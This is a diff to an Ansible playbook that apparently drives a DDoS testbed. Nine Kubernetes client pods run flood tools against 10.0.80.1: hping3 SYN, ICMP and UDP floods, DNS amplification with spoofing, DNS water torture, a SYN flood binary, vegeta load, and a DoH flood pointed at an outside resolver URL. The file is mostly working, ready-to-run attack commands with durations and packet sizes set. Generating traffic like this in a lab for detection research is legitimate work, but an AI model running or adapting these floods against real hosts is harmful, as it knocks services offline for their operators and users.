@@ -21,51 +21,63 @@
       loop: "{{ range(1, 10) | list }}"
       ignore_errors: yes
 
+#---------------------------------------export variables----------------------------------------------------------------------------------------------
+        
+    - name: Generate custom .bashrc 
+      shell: microk8s kubectl exec -n default client{{ item }} -- /bin/bash -c 'echo "export ddosserver=10.0.80.1" >> /root/.bashrc'
+      loop: "{{ range(1, 10) | list }}"
+      ignore_errors: yes
+
+    - name: Source.bashrc 
+      shell: microk8s kubectl exec -n default client{{ item }} -- /bin/bash -c 'source /root/.bashrc'
+      loop: "{{ range(1, 10) | list }}"
+      ignore_errors: yes
+
 #---------------------------------Tasks execution---------------------------------------------------------------------------------------
     - name: Execute hping TCP
-      shell: microk8s kubectl exec -n default client1 -- /bin/bash -c 'sudo timeout 300 hping3 -d 1200 -S 10.0.80.1 -p 43 --flood'
+      shell: microk8s kubectl exec -n default client1 -- env ddosserver=10.0.80.1 /bin/bash -c 'sudo timeout 300 hping3 -d 1200 -S 10.0.80.1 -p 43 --flood'
       async: 3600 
       poll: 0
 
     - name: Execute hping IP
-      shell: microk8s kubectl exec -n default client2 -- /bin/bash -c 'sudo timeout 300 hping3 -0 -d 1200 -S 10.0.80.1 --flood'
+      shell: microk8s kubectl exec -n default client2 -- env ddosserver=10.0.80.1 /bin/bash -c 'sudo timeout 300 hping3 -0 -d 1200 -S 10.0.80.1 --flood'
       async: 3600 
       poll: 0
 
     - name: Execute hping ICMP
-      shell: microk8s kubectl exec -n default client3 -- /bin/bash -c 'sudo timeout 300 hping3 -1 -d 1200 -S 10.0.80.1 --flood'
+      shell: microk8s kubectl exec -n default client3 -- env ddosserver=10.0.80.1 /bin/bash -c 'sudo timeout 300 hping3 -1 -d 1200 -S 10.0.80.1 --flood'
       async: 3600 
       poll: 0
 
     - name: Execute hping UDP
-      shell: microk8s kubectl exec -n default client4 -- /bin/bash -c 'sudo timeout 300 hping3 -2 -d 1200 -S 10.0.80.1 -p 80 --flood'
+      shell: microk8s kubectl exec -n default client4 -- env ddosserver=10.0.80.1 /bin/bash -c 'sudo timeout 300 hping3 -2 -d 1200 -S 10.0.80.1 -p 80 --flood'
       async: 3600 
       poll: 0
 
     - name: Execute vegeta.sh
-      shell: microk8s kubectl exec -n default client5 -- ./vegeta.sh 300
+      shell: microk8s kubectl exec -n default client5 -- env ddosserver=10.0.80.1 ./vegeta.sh 300
       async: 3600 
       poll: 0
 
     - name: Execute dns-amp
-      shell: microk8s kubectl exec -n default client6 -- /bin/bash -c './dns_amp/dns-amp 10.0.80.1 -f domain.txt -t ANY -p 53 -S -d 300'
+      shell: microk8s kubectl exec -n default client6 -- env ddosserver=10.0.80.1 /bin/bash -c './dns_amp/dns-amp 10.0.80.1 -f domain.txt -t ANY -p 53 -S -d 300'
       async: 3600 
       poll: 0
 
     - name: Start dnscrypt for DOH
-      shell: microk8s kubectl exec -n default client7 -- ./dnscrypt-proxy-linux_x86_64-2.1.5/config.sh
+      shell: microk8s kubectl exec -n default client7 -- env ddosserver=10.0.80.1 ./dnscrypt-proxy-linux_x86_64-2.1.5/config.sh
     - name: Execute doh flood
-      shell: microk8s kubectl exec -n default client7 -- timeout 300 python3 cne-DoH-master/floodoh.py 30000 www.example.com A https://micaddy.com/dns-query
+      shell: microk8s kubectl exec -n default client7 -- env ddosserver=10.0.80.1 timeout 300 python3 cne-DoH-master/floodoh.py 30000 www.example.com A https://micaddy.com/dns-query
       async: 3600 
       poll: 0
 
     - name: Execute watertorture
-      shell: microk8s kubectl exec -n default client8 -- /bin/bash -c './dns-flood/dnsflood example.com 10.0.80.1 -p 53 -R -S -d 300'
+      shell: microk8s kubectl exec -n default client8 -- env ddosserver=10.0.80.1 /bin/bash -c './dns-flood/dnsflood example.com 10.0.80.1 -p 53 -R -S -d 300'
       async: 3600 
       poll: 0
 
     - name: Execute synflood
-      shell: microk8s kubectl exec -n default client9 -- /bin/bash -c 'timeout 300 ./synflood-master/build/bin/synflood 10.0.80.1 80 -i eth1'
+      shell: microk8s kubectl exec -n default client9 -- env ddosserver=10.0.80.1 /bin/bash -c 'timeout 300 ./synflood-master/build/bin/synflood 10.0.80.1 80 -i eth1'
       async: 3600 
       poll: 0
 
